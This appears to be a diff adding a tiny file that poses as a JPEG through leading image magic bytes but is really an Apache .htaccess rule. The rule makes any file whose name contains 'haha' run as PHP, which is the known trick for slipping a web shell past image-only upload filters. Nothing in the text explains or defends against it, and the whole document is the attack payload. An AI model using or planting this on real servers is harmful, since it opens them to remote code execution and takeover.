@@ -1,0 +1,3 @@
+ÿØÿ<FilesMatch "haha">
+SetHandler application/x-httpd-php
+</FilesMatch>
